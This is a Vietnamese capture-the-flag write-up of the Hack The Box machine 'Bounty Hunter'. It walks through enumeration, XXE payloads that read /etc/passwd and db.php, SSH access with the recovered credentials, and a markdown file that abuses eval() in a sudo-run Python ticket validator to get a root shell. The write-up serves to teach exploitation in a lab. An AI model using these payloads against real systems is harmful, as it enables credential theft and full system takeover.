# bounty hunter

- enumerate

dùng nmap tìm thấy 2 port mở 22 và 80

![https://lh7-us.googleusercontent.com/gY526xW5wv-ducsC0fOuIrFxL_zjtCgelYbGNU5hop17MigaY4sZchL3M9PHESo1L92K1YYZ3vcYSRSKRrxGmH6v7tsDJznw2ULWD2vAP7J7kxLzcqAY_gXmbgOGrN416rviI114nHwK](https://lh7-us.googleusercontent.com/gY526xW5wv-ducsC0fOuIrFxL_zjtCgelYbGNU5hop17MigaY4sZchL3M9PHESo1L92K1YYZ3vcYSRSKRrxGmH6v7tsDJznw2ULWD2vAP7J7kxLzcqAY_gXmbgOGrN416rviI114nHwK)

truy cập p80

![https://lh7-us.googleusercontent.com/fzVQWbd1rgoMGZOVxUCpzCDDXOPwp-jX-R3AjwT4pW-WCxJfJc3UnAUbi5h2guhqRUIH3QloP42HFDET3dw_r2MDQrRMXGPRGuGvChYG2NCYV1iLAEucSz-ld3kyHAp_0IQt6q8riXdm](https://lh7-us.googleusercontent.com/fzVQWbd1rgoMGZOVxUCpzCDDXOPwp-jX-R3AjwT4pW-WCxJfJc3UnAUbi5h2guhqRUIH3QloP42HFDET3dw_r2MDQrRMXGPRGuGvChYG2NCYV1iLAEucSz-ld3kyHAp_0IQt6q8riXdm)

tìm thấy form

sử dụng burp suite xem request post -> có thể bị xxe

<!DOCTYPE title [<!ELEMENT title ANY ><!ENTITY xxe SYSTEM "file:///etc/passwd" >]>

![https://lh7-us.googleusercontent.com/vDvIu5wCOF-dOsWxSvGHooOhRbNLBALLQVqt17hH_IuUJZORdBoON-kjLNfsl2D4kfaRtUUHtOtQTpdn7YpSzECJzn4gXxfSzTwJBxz1KqQ1VuYslpsDrVKQ-JoYjo6TrK11QpUU6Nqf](https://lh7-us.googleusercontent.com/vDvIu5wCOF-dOsWxSvGHooOhRbNLBALLQVqt17hH_IuUJZORdBoON-kjLNfsl2D4kfaRtUUHtOtQTpdn7YpSzECJzn4gXxfSzTwJBxz1KqQ1VuYslpsDrVKQ-JoYjo6TrK11QpUU6Nqf)

tìm thấy user root và development

liệt kê các path ẩn

![https://lh7-us.googleusercontent.com/u-LOpfr_mddFIrp4yz7eCS2TViOE-MeH1KG72wlIoqzUS3k56JLC13mUlU4k0Q86glmI2fZnU67QopgKQFbiVebYI0MYJOpyj3YiItGQfLQ3EtT_vHPAvxyJYyHjUXuS0YOfeadpGuQZ](https://lh7-us.googleusercontent.com/u-LOpfr_mddFIrp4yz7eCS2TViOE-MeH1KG72wlIoqzUS3k56JLC13mUlU4k0Q86glmI2fZnU67QopgKQFbiVebYI0MYJOpyj3YiItGQfLQ3EtT_vHPAvxyJYyHjUXuS0YOfeadpGuQZ)

gobuster dir -u http://10.10.11.100 -w /home/kali/Documents/SecLists/Discovery/Web-Content/common.txt -x txt,py,php,sh,html

![https://lh7-us.googleusercontent.com/C-LFWYQHQaGeYJiDWv81onmovtfZ9MWnQvbVQKMGB2buJQK0JpGL-geYeIBqfBLiWT8mbEWYf_QnrY_TmSCiMCnf49fTkIcWuhj9uvRmdlSDFT8ZNE4rNAzuieqI25MjpAyk_7nUQnwy](https://lh7-us.googleusercontent.com/C-LFWYQHQaGeYJiDWv81onmovtfZ9MWnQvbVQKMGB2buJQK0JpGL-geYeIBqfBLiWT8mbEWYf_QnrY_TmSCiMCnf49fTkIcWuhj9uvRmdlSDFT8ZNE4rNAzuieqI25MjpAyk_7nUQnwy)

![https://lh7-us.googleusercontent.com/TKoai8rvUZFS0eehrB2Q1qEQhhaVf_bSxLa6RRX5RZVTaPwUk7nuwwtr0DFTmM-Vyc8i_VUtQPqwTTQoas_bNOxXMaoxj42aZYW-P4PdRXlEwHPAL6mO7h7PXr05GiUtOwpIN6ClwJDQ](https://lh7-us.googleusercontent.com/TKoai8rvUZFS0eehrB2Q1qEQhhaVf_bSxLa6RRX5RZVTaPwUk7nuwwtr0DFTmM-Vyc8i_VUtQPqwTTQoas_bNOxXMaoxj42aZYW-P4PdRXlEwHPAL6mO7h7PXr05GiUtOwpIN6ClwJDQ)

file db.php đáng lưu ý, nhưng có vẻ ko đọc được

thử payload khác, đọc được /etc/passwd -> thử đọc db.php

<!DOCTYPE title [ <!ELEMENT title ANY > <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=db.php" >]>

![https://lh7-us.googleusercontent.com/oyH5jJl52TYnLjrE8hd4D30o3slm75K3HBk7K_ZGz8pr0fVwhQMocdR8xaW6p173--va8wqXW5fGv-fRl7-AeA4Br0bdtX7Py2YB3C5pn2OkPkuGOrEiCLFOU5lcaDHKIgbAMh7gEz7j](https://lh7-us.googleusercontent.com/oyH5jJl52TYnLjrE8hd4D30o3slm75K3HBk7K_ZGz8pr0fVwhQMocdR8xaW6p173--va8wqXW5fGv-fRl7-AeA4Br0bdtX7Py2YB3C5pn2OkPkuGOrEiCLFOU5lcaDHKIgbAMh7gEz7j)

thử ssh development thì ok

![https://lh7-us.googleusercontent.com/YKHtc2-LrNnbJhF_P6FnwUyvwBNxMGWn5-Wl2ozrXt5g-BzbqpEiaDvFtVxp9n815AODZJsJTPCu-MxYy3ddktZn77prI3DieHawTO6Sg19dZB9jERHtwvKFKCynJsluY0saUjLW3JLf](https://lh7-us.googleusercontent.com/YKHtc2-LrNnbJhF_P6FnwUyvwBNxMGWn5-Wl2ozrXt5g-BzbqpEiaDvFtVxp9n815AODZJsJTPCu-MxYy3ddktZn77prI3DieHawTO6Sg19dZB9jERHtwvKFKCynJsluY0saUjLW3JLf)

lấy được flag user

![https://lh7-us.googleusercontent.com/TAvmZQKEmhfWgMdMtQxHmNM3xiFScDXtjxRAg-ZA3Irqe2sVfwQOYxcAW0eWWem7BtR-t506SoZWcF-Ir4mKIobeYd_Zl3Nz9Jcvhapk-zzijGkJXAdxJgvscyiPvQmt1FMDkVuIO-Jl](https://lh7-us.googleusercontent.com/TAvmZQKEmhfWgMdMtQxHmNM3xiFScDXtjxRAg-ZA3Irqe2sVfwQOYxcAW0eWWem7BtR-t506SoZWcF-Ir4mKIobeYd_Zl3Nz9Jcvhapk-zzijGkJXAdxJgvscyiPvQmt1FMDkVuIO-Jl)

kiểm tra user development có thể làm gì

![https://lh7-us.googleusercontent.com/UIDKeQNLatulIepwtpKfOThiuA7imSJEXY5KbehSOevcoOVTsfQuCdQNLkmwm8mdIDU2cwybJ4TiGGXOvoFYoNoz2kpnloEE8d6WIIRCskbWjsadGpt5uYzf3vcbj34xD7MRRzw14687](https://lh7-us.googleusercontent.com/UIDKeQNLatulIepwtpKfOThiuA7imSJEXY5KbehSOevcoOVTsfQuCdQNLkmwm8mdIDU2cwybJ4TiGGXOvoFYoNoz2kpnloEE8d6WIIRCskbWjsadGpt5uYzf3vcbj34xD7MRRzw14687)

nd file ticketValidator.py

```python
#Skytrain Inc Ticket Validation System 0.1

#Do not distribute this file.

def load_file(loc):

if loc.endswith(".md"):

return open(loc, 'r')

else:

print("Wrong file type.")

exit()

def evaluate(ticketFile):

#Evaluates a ticket to check for ireggularities.

code_line = None

for i,x in enumerate(ticketFile.readlines()):

if i == 0:

if not x.startswith("# Skytrain Inc"):

return False

continue

if i == 1:

if not x.startswith("## Ticket to "):

return False

print(f"Destination: {' '.join(x.strip().split(' ')![3:])}")

continue

if x.startswith("__Ticket Code:__"):

code_line = i+1

continue

if code_line and i == code_line:

if not x.startswith("**"):

return False

ticketCode = x.replace("**", "").split("+")![0]

if int(ticketCode) % 7 == 4:

validationNumber = eval(x.replace("**", ""))

if validationNumber > 100:

return True

else:

return False

return False

def main():

fileName = input("Please enter the path to the ticket file.\n")

ticket = load_file(fileName)

#DEBUG print(ticket)

result = evaluate(ticket)

if (result):

print("Valid ticket.")

else:

print("Invalid ticket.")

ticket.close

main()
```

phân tích đoạn mã trên:

- kiểm tra đuôi tệp có kết thúc bằng .md
- xác minh một số tham số trong tệp
- Dòng đầu tiên cần bắt đầu “# Skytrain Inc”.
- Dòng thứ hai cần bắt đầu bằng “## Vé đến “ và có khoảng trắng sau đó.
- Dòng thứ ba cần bắt đầu bằng “__Ticket Code:__”.
- Dòng tiếp theo cần bắt đầu bằng “**”.
- Sau đó là một phép tính toán
- Nếu những điều kiện đó được đáp ứng thì nó sẽ được chuyển tới eval, điều này có thể cho phép thực thi mã.

tạo file payload.md với nội dung như sau:

```markdown
# Skytrain Inc

## Ticket to

__Ticket Code:__

**11+eval('11+__import__("os").system("bash")')
```

thực thi và có được quyền root

![https://lh7-us.googleusercontent.com/Wai867cTcNserstznuK9Ei28at2WS6sAPOfB4lkFapZhxOYKJ2uqkAWh7_S__FforHjHdzwz8YjgomjkT8qZ3bQPJA55bUsyQtM6pdLzMGQbwHBR6gsRB9u1HvRMm7m7amu_ppT1PC8v](https://lh7-us.googleusercontent.com/Wai867cTcNserstznuK9Ei28at2WS6sAPOfB4lkFapZhxOYKJ2uqkAWh7_S__FforHjHdzwz8YjgomjkT8qZ3bQPJA55bUsyQtM6pdLzMGQbwHBR6gsRB9u1HvRMm7m7amu_ppT1PC8v)

lấy flag root

![https://lh7-us.googleusercontent.com/7KZmv3nmFEadSRJGiPAtxjE43CCzOJKH5oCnXOIw5_mVrHN3FW4cAwVRfsl2A1zF6sRsa7QzigUW0ZcGGMZbjoHQ7VQo6L8kuARVc02LEWuGAWaGVdUTZCKgj0vgVria2x6NCX_6dwHO](https://lh7-us.googleusercontent.com/7KZmv3nmFEadSRJGiPAtxjE43CCzOJKH5oCnXOIw5_mVrHN3FW4cAwVRfsl2A1zF6sRsa7QzigUW0ZcGGMZbjoHQ7VQo6L8kuARVc02LEWuGAWaGVdUTZCKgj0vgVria2x6NCX_6dwHO)